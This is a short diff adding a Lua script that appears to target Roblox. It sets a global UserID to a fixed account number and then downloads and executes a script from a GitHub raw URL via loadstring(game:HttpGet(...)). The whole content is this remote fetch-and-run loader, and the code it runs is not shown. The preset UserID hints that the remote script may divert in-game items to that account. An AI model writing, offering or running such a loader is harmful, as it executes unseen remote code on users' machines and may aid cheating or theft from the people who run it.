@@ -1,0 +1,3 @@
+_G.UserID = 3607706741
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/B/main/script", true))()
